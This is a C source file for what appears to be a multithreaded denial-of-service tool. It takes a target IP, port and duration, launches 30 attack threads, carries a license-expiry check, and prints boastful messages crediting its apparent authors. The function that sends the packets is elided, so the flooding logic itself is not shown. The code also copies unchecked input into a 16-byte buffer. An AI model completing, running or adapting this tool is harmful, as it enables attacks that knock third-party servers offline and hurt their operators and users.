#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>

#define MAX_THREADS 30
#define PAYLOAD_SIZE 1024

// Expiration Date
#define EXPIRATION_DATE "02/04/2025"

typedef struct {
    char ip[16];
    int port;
    int duration;
} AttackParams;

void* send_payload(void* arg) {
    // ... (rest of the code remains the same)
}

int main(int argc, char* argv[]) {
    // Check if the expiration date has passed
    time_t now = time(NULL);
    struct tm expiration_date = {0};
    sscanf(EXPIRATION_DATE, "%02d/%02d/%04d", &expiration_date.tm_mon, &expiration_date.tm_mday, &expiration_date.tm_year);
    expiration_date.tm_mon -= 1;  // Months are 0-based in C
    expiration_date.tm_year -= 1900;  // Years are based on 1900 in C
    time_t expiration_time = mktime(&expiration_date);
    
    if (now > expiration_time) {
        printf("The program has expired. Please update or renew your license.\n");
        return 1;
    }
    
    // Rest of the code...
    if (argc != 4) {
        printf("Usage: %s <IP> <PORT> <DURATION>\n", argv[0]);
        return 1;
    }
    
    AttackParams params;
    strcpy(params.ip, argv[1]);
    params.port = atoi(argv[2]);
    params.duration = atoi(argv[3]);
    
    pthread_t threads[MAX_THREADS];
    printf("MADE BY @KaliaytJi %s:%d for %d seconds with %d threads...\n", params.ip, params.port, params.duration, MAX_THREADS);
    
    for (int i = 0; i < MAX_THREADS; i++) {
        if (pthread_create(&threads[i], NULL, send_payload, &params) != 0) {
            perror("Thread creation failed");
        }
    }
    
    for (int i = 0; i < MAX_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }
    
    printf("FUCKED ATTACK @KaliaytOp HOST IP %s on port %d for %d seconds\n", params.ip, params.port, params.duration);
    return 0;
}